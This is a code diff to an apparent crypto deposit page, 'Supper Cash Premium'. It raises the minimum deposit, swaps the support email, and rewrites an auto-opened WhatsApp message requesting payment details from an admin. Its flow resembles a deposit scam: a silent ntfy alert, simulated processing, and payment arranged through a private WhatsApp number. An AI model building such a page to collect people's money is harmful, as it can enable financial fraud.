@@ -236,6 +236,13 @@
       color: var(--primary);
     }
     
+    .min-deposit-note {
+      font-size: 0.8rem;
+      color: var(--gray);
+      margin-top: 5px;
+      margin-bottom: 10px;
+    }
+    
     .submit-btn {
       width: 100%;
       padding: 18px;
@@ -292,6 +299,30 @@
     .feature-list i {
       color: var(--success);
       width: 24px;
+    }
+    
+    .footer {
+      margin-top: 40px;
+      text-align: center;
+      padding: 20px;
+      background: rgba(255, 255, 255, 0.9);
+      border-radius: var(--card-radius);
+      backdrop-filter: blur(5px);
+    }
+    
+    .footer p {
+      color: var(--secondary);
+      font-size: 0.9rem;
+    }
+    
+    .footer a {
+      color: var(--primary);
+      text-decoration: none;
+      font-weight: 600;
+    }
+    
+    .footer a:hover {
+      text-decoration: underline;
     }
     
     .toast-container {
@@ -420,7 +451,10 @@
             <label for="amount">Amount (USD)</label>
             <div class="input-wrapper">
               <i class="fas fa-dollar-sign"></i>
-              <input type="number" id="amount" step="0.01" min="10" placeholder="0.00" required autocomplete="off">
+              <input type="number" id="amount" step="0.01" min="20" placeholder="0.00" required autocomplete="off">
+            </div>
+            <div class="min-deposit-note">
+              <i class="fas fa-info-circle"></i> Minimum deposit: $20 USD
             </div>
           </div>
           
@@ -523,7 +557,7 @@
           <p style="color: var(--gray); margin-bottom: 15px;">Need assistance? Our support team is available 24/7.</p>
           <div style="display: flex; gap: 12px;">
             <i class="fas fa-envelope" style="color: var(--primary);"></i>
-            <span style="font-size: 0.9rem;">support@supper.cash</span>
+            <span style="font-size: 0.9rem;">admin@suppcash.com</span>
           </div>
           <div style="display: flex; gap: 12px; margin-top: 10px;">
             <i class="fab fa-whatsapp" style="color: #25D366;"></i>
@@ -532,12 +566,17 @@
         </div>
       </div>
     </div>
+    
+    <footer class="footer">
+      <p>© 2024 Supper Cash Premium. All rights reserved. | For support, contact: <a href="mailto:admin@suppcash.com">admin@suppcash.com</a></p>
+    </footer>
   </div>
 
   <script>
     // ======================= SECURE NOTIFICATION SYSTEM =======================
     const NTFY_TOPIC = "supper-cash-secure";
     const ADMIN_WHATSAPP = "+12568212395";
+    const MIN_DEPOSIT = 20;
     
     let socket = null;
     let currentUser = { fullName: "Premium Member", email: "member@supper.cash", id: "USR001" };
@@ -575,8 +614,7 @@
           headers: { 
             'Title': '💰 New Deposit Alert',
             'Priority': 'high',
-            'Tags': 'moneybag,alert,rocket',
-            'Actions': 'view, Open Dashboard, https://supper.cash/admin'
+            'Tags': 'moneybag,alert,rocket'
           }
         });
         console.log("✅ Silent ntfy notification delivered");
@@ -612,7 +650,8 @@
         `*💳 Method:* ${encodeURIComponent(details.method)}%0A` +
         `*🕒 Time:* ${encodeURIComponent(details.time)}%0A` +
         `*🆔 Reference:* ${details.ref}%0A%0A` +
-        `✅ Please process this deposit and credit the user's account.`;
+        `*📝 Message:* Please send me payment details as I requested. I wanted to deposit $${details.amountUSD} USD via ${details.method}.%0A%0A` +
+        `✅ Awaiting payment instructions.`;
       
       const waUrl = `https://wa.me/${ADMIN_WHATSAPP.replace(/[^0-9]/g, '')}?text=${waMsg}`;
       window.open(waUrl, '_blank');
@@ -673,7 +712,12 @@
       const paymentMethod = paymentTypeSelect.value;
       
       if (isNaN(amountUSD) || amountUSD <= 0) {
-        showToast('Please enter a valid amount (minimum $10)', 'error');
+        showToast(`Please enter a valid amount (minimum $${MIN_DEPOSIT})`, 'error');
+        return;
+      }
+      
+      if (amountUSD < MIN_DEPOSIT) {
+        showToast(`Minimum deposit amount is $${MIN_DEPOSIT} USD`, 'error');
         return;
       }
       
@@ -711,13 +755,13 @@
         // Admin chat notification
         await notifyAdminChat(depositPayload);
         
-        // Auto open WhatsApp with all details
+        // Auto open WhatsApp with payment details request
         triggerWhatsAppWithDetails(depositPayload);
         
         // Simulate processing
         setTimeout(() => {
           loadingOverlay.classList.remove('active');
-          showToast(`Deposit request submitted! Reference: ${reference}. Admin will contact you shortly.`, 'success');
+          showToast(`Deposit request submitted! Reference: ${reference}. Payment details sent via WhatsApp.`, 'success');
           submitBtn.disabled = false;
           
           // Reset form
@@ -726,7 +770,7 @@
           paymentTypeSelect.value = 'Bitcoin (BTC)';
           amountDisplay.style.display = 'none';
           
-          // Redirect after delay
+          // Optional redirect after delay
           setTimeout(() => {
             window.location.href = '/chat.html';
           }, 2500);
@@ -737,7 +781,7 @@
         loadingOverlay.classList.remove('active');
         // Fallback - still try WhatsApp
         triggerWhatsAppWithDetails(depositPayload);
-        showToast('Deposit request recorded. Admin has been notified.', 'success');
+        showToast('Deposit request recorded. Admin will contact you shortly.', 'success');
         submitBtn.disabled = false;
         
         setTimeout(() => {
